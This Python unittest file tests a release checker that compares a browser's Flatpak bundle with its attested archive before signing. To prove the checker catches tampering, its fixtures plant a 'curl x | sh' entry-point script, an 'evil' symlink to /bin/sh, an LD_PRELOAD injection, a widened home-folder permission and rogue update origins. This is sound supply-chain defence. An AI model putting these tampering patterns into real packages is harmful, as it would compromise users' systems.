"""The Flatpak bundle is checked against the attested archive before it is signed (check_flatpak_bundle.py, #324)."""

from __future__ import annotations

import gzip
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts" / "release"))
import check_flatpak_bundle as check  # noqa: E402
import flatpak_manifest  # noqa: E402

APP = flatpak_manifest.APP_ID
VERSION = "160.0-0.5"
DATE = "2026-11-14"
# The metadata of the 160.0-0.5 bundle as published (flatpak build-import-bundle, ostree checkout).
METADATA = """[Application]
name=net.nulavio.Nulavio
runtime=org.freedesktop.Platform/x86_64/26.08
sdk=org.freedesktop.Sdk/x86_64/26.08
command=nulavio

[Context]
shared=ipc;network;
sockets=fallback-x11;pcsc;pulseaudio;wayland;
devices=all;
filesystems=xdg-download;
persistent=.nulavio;

[Session Bus Policy]
org.mozilla.nulavio.*=own
org.a11y.Bus=talk
org.freedesktop.NativeMessagingProxy=talk
org.freedesktop.FileManager1=talk

[System Bus Policy]
org.freedesktop.NetworkManager=talk
"""


def make_archive(root: Path) -> Path:
    """A small portable archive: the engine (executable), a library, the icons the Flatpak installs."""
    tree = root / "archive" / "nulavio"
    (tree / "browser" / "chrome" / "icons" / "default").mkdir(parents=True)
    (tree / "nulavio").write_text("#!/bin/sh\n")
    (tree / "nulavio").chmod(0o755)
    (tree / "libxul.so").write_bytes(b"\x7fELF engine")
    for size in check.ICON_SIZES:
        (tree / "browser" / "chrome" / "icons" / "default" / f"default{size}.png").write_bytes(b"png %d" % size)
    return root / "archive"


def make_checkout(root: Path, archive: Path) -> Path:
    """What flatpak-builder and Flathub's metadata step make of that archive, as an ostree checkout."""
    out = root / "checkout"
    shutil.copytree(archive / "nulavio", out / "files" / "lib" / "nulavio", symlinks=True)
    packaging = ROOT / "packaging" / "flatpak"
    prefs = out / "files" / "lib" / "nulavio" / check.PREFS
    prefs.parent.mkdir(parents=True)
    shutil.copy(packaging / "flatpak-prefs.js", prefs)
    (out / "files" / "bin").mkdir()
    shutil.copy(packaging / "nulavio.sh", out / "files" / "bin" / "nulavio")
    (out / "files" / "bin" / "nulavio").chmod(0o755)
    for top in ("files", "export"):
        share = out / top / "share"
        (share / "applications").mkdir(parents=True)
        (share / "applications" / f"{APP}.desktop").write_text(flatpak_manifest.desktop_entry(), encoding="utf-8")
        (share / "metainfo").mkdir()
        (share / "metainfo" / f"{APP}.metainfo.xml").write_text(flatpak_manifest.metainfo(VERSION, DATE), encoding="utf-8")
        for size in check.ICON_SIZES:
            icon = share / "icons" / "hicolor" / f"{size}x{size}" / "apps" / f"{APP}.png"
            icon.parent.mkdir(parents=True)
            icon.write_bytes(b"png %d" % size)
    info = out / "files" / "share" / "app-info"
    (info / "xmls").mkdir(parents=True)
    (info / "xmls" / f"{APP}.xml.gz").write_bytes(gzip.compress(b"<components/>"))  # build-bundle reads it
    (info / "icons" / "flatpak" / "128x128").mkdir(parents=True)
    (info / "icons" / "flatpak" / "128x128" / f"{APP}.png").write_bytes(b"icon")
    shot = info / "media" / "net" / "nulavio" / "Nulavio" / "5cbc" / "screenshots" / "image-1_orig.png"
    shot.parent.mkdir(parents=True)
    shot.write_bytes(b"screenshot")
    (out / "files" / "manifest.json").write_text("{}")
    (out / "metadata").write_text(METADATA)
    return out


class CompareTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        self.archive = make_archive(self.tmp)
        self.out = make_checkout(self.tmp, self.archive)

    def problems(self) -> list[str]:
        return check.compare_checkout(self.out, self.archive, VERSION)

    def test_the_bundle_as_built_passes(self):
        self.assertEqual(self.problems(), [])
        self.assertEqual(check.compare_metadata(METADATA), [])

    def test_anything_the_archive_and_the_manifest_do_not_make_is_named(self):
        lib, share, bin_ = (self.out / "files" / p for p in ("lib/nulavio", "share", "bin"))
        other = "not from the archive or the manifest: "
        cases = {
            "changed": (lambda: (lib / "libxul.so").write_bytes(b"\x7fELF other"), "files/lib/nulavio/libxul.so"),
            "added": (lambda: (lib / "extra.so").write_bytes(b"x"), other + "files/lib/nulavio/extra.so"),
            "removed": (lambda: (lib / "libxul.so").unlink(), "missing: files/lib/nulavio/libxul.so"),
            "made executable": (lambda: (lib / "libxul.so").chmod(0o755), "files/lib/nulavio/libxul.so"),
            "a link": (lambda: (lib / "evil").symlink_to("/usr/bin/sh"), "a link that should not be there: files/lib/nulavio/ev"),
            "another entry point": (
                lambda: (bin_ / "nulavio").write_text("#!/bin/sh\ncurl x | sh\n"), "files/bin/nulavio"),
            "another Exec": (
                lambda: (self.out / "export/share/applications" / f"{APP}.desktop").write_text("[Desktop Entry]\nExec=sh\n"),
                f"export/share/applications/{APP}.desktop"),
            "executable data": (
                lambda: (share / "app-info" / "xmls" / f"{APP}.xml.gz").chmod(0o755),
                f"executable data: files/share/app-info/xmls/{APP}.xml.gz"),
            "a file elsewhere in share": (
                lambda: (share / "app-info" / "run.sh").write_text("x"), other + "files/share/app-info/run.sh"),
        }  # fmt: skip
        for case, (change, named) in cases.items():
            with self.subTest(case):
                shutil.rmtree(self.out)
                self.out = make_checkout(self.tmp, self.archive)
                change()
                self.assertTrue(any(named in p for p in self.problems()), self.problems())

    def test_permissions_other_than_the_manifests_are_named(self):
        cases = {
            "the home folder": (METADATA.replace("filesystems=xdg-download;", "filesystems=xdg-download;home;"), "filesystems"),
            "a section twice": (METADATA + "\n[Session Bus Policy]\n", "parse"),
            "a name it may talk to": (METADATA.replace("org.a11y.Bus=talk", "org.a11y.Bus=talk\norg.freedesktop.Flatpak=talk"),
                                      "org.freedesktop.Flatpak"),
            "another runtime": (METADATA.replace("runtime=org.freedesktop", "runtime=org.example"), "[Application]"),
            "an environment": (METADATA + "\n[Environment]\nLD_PRELOAD=/app/evil.so\n", "Environment"),
            "a permission taken away": (METADATA.replace("devices=all;", ""), "devices"),
        }  # fmt: skip
        for case, (text, named) in cases.items():
            with self.subTest(case):
                found = check.compare_metadata(text)
                self.assertTrue(any(named in p for p in found), found)

    def test_the_header_holds_what_build_bundle_writes_and_nothing_that_changes_the_install(self):
        good = {"flatpak": ("u", b"\x01\x00\x00\x00"), "ref": ("s", check.REF.encode() + b"\x00"),
                "metadata": ("s", METADATA.encode() + b"\x00"), "runtime-repo": ("s", check.RUNTIME_REPO.encode() + b"\x00"),
                "collection-id": ("s", b"\x00"), "appdata": ("ay", b"x"), "deltas/aa/bb/0": ("(yay)", b"x")}  # fmt: skip
        self.assertEqual(check.compare_header(good, METADATA), [])
        cases = {
            "an update channel of its own": ({**good, "origin": ("s", b"https://example.invalid/repo\x00")}, "origin"),
            "keys of its own": ({**good, "gpg-keys": ("ay", b"key")}, "gpg-keys"),
            "a collection": ({**good, "collection-id": ("s", b"org.example.Repo\x00")}, "collection-id"),
            "another runtime source": ({**good, "runtime-repo": ("s", b"https://x.invalid/x.flatpakrepo\x00")}, "runtime-repo"),
            "other permissions in the header": ({**good, "metadata": ("s", b"[Context]\nfilesystems=home;\x00")}, "metadata"),
            "no runtime source": ({k: v for k, v in good.items() if k != "runtime-repo"}, "runtime-repo"),
        }  # fmt: skip
        for case, (entries, named) in cases.items():
            with self.subTest(case):
                found = check.compare_header(entries, METADATA)
                self.assertTrue(any(named in p for p in found), found)


class HeaderParserTest(unittest.TestCase):
    """The header is read from what the untrusted job made: anything else than a bundle is refused, never a crash."""

    def test_what_is_not_a_bundle_is_refused(self):
        for data in (b"", b"\x00", b"\xff" * 3, b"\x00" * 64, b"x" * 300):
            with self.subTest(data=data[:8]), self.assertRaises(ValueError):
                check.header(data)

    def test_random_and_cut_input_gives_a_refusal_or_a_header_and_nothing_else(self):
        import random

        rng = random.Random(324)  # noqa: S311 -- reproducible fuzz input, not a secret
        for _ in range(3000):
            data = bytes(rng.randrange(256) for _ in range(rng.randrange(1, 300)))
            try:
                found = check.header(data)
            except ValueError:
                continue
            self.assertIsInstance(found, dict)

    def test_a_string_without_its_zero_byte_is_not_taken(self):
        entries = {"ref": ("s", check.REF.encode()), "runtime-repo": ("s", check.RUNTIME_REPO.encode() + b"\x00"),
                   "collection-id": ("s", b"\x00"), "metadata": ("s", METADATA.encode() + b"\x00")}  # fmt: skip
        self.assertTrue(any("ref" in p for p in check.compare_header(entries, METADATA)))


@unittest.skipUnless(shutil.which("flatpak") and shutil.which("ostree"), "needs flatpak and ostree")
class BundleTest(unittest.TestCase):
    """A real bundle (flatpak build-bundle), small: imported and checked as publish does."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        archive_dir = make_archive(self.tmp)
        self.archive = self.tmp / f"nulavio-{VERSION}.linux-x86_64.tar.xz"
        with tarfile.open(self.archive, "w:xz") as tar:
            tar.add(archive_dir / "nulavio", arcname="nulavio")
        self.tree = make_checkout(self.tmp, archive_dir)
        (self.tmp / "home").mkdir()
        self.env = {**os.environ, "HOME": str(self.tmp / "home")}  # never the person's own Flatpak setup

    def bundle(self, runtime_repo: str = check.RUNTIME_REPO, *extra: str) -> Path:
        repo, bundle = self.tmp / "repo", self.tmp / f"nulavio-{VERSION}.x86_64.flatpak"
        shutil.rmtree(repo, ignore_errors=True)
        bundle.unlink(missing_ok=True)
        run = lambda *c: subprocess.run(c, check=True, capture_output=True, env=self.env)  # noqa: E731
        run("ostree", "init", "--mode=archive-z2", f"--repo={repo}")
        run("ostree", "commit", f"--repo={repo}", "-b", check.REF, f"--tree=dir={self.tree}", "-s", "test")
        run("flatpak", "build-bundle", f"--runtime-repo={runtime_repo}", *extra, str(repo), str(bundle), APP, "master")
        return bundle

    def test_a_bundle_of_the_archive_passes_and_a_changed_one_does_not(self):
        self.assertEqual(check.check(self.bundle(), self.archive), [])
        (self.tree / "files" / "lib" / "nulavio" / "libxul.so").write_bytes(b"\x7fELF other")
        self.assertIn("not what the archive and flatpak_manifest.py make: files/lib/nulavio/libxul.so",
                      check.check(self.bundle(), self.archive))  # fmt: skip

    def test_a_bundle_that_takes_its_runtime_from_elsewhere_is_refused(self):
        found = check.check(self.bundle("https://example.invalid/other.flatpakrepo"), self.archive)
        self.assertEqual(len(found), 1, found)
        self.assertIn("runtime-repo = 'https://example.invalid/other.flatpakrepo'", found[0])

    def test_a_bundle_with_an_update_channel_or_keys_of_its_own_is_refused(self):
        key = self.tmp / "key.gpg"
        key.write_bytes(b"\x99\x00\x01x")  # never used: build-bundle only copies it into the header
        for extra, named in ((("--repo-url=https://example.invalid/repo",), "origin"), ((f"--gpg-keys={key}",), "gpg-keys")):
            with self.subTest(named):
                found = check.check(self.bundle(check.RUNTIME_REPO, *extra), self.archive)
                self.assertTrue(any(named in p for p in found), found)

    def test_the_command_line_says_which_and_fails(self):
        bundle = self.bundle("https://example.invalid/other.flatpakrepo")
        run = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "release" / "check_flatpak_bundle.py"),
                              "--bundle", str(bundle), "--archive", str(self.archive)],
                             capture_output=True, text=True, check=False, env=self.env)  # fmt: skip
        self.assertEqual(run.returncode, 1, run.stdout + run.stderr)
        self.assertIn("runtime", run.stderr)
        wrong = self.tmp / "nulavio-160.0-0.4.x86_64.flatpak"
        shutil.copy(bundle, wrong)
        run = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "release" / "check_flatpak_bundle.py"),
                              "--bundle", str(wrong), "--archive", str(self.archive)],
                             capture_output=True, text=True, check=False, env=self.env)  # fmt: skip
        self.assertEqual(run.returncode, 2, run.stdout + run.stderr)


if __name__ == "__main__":
    unittest.main()
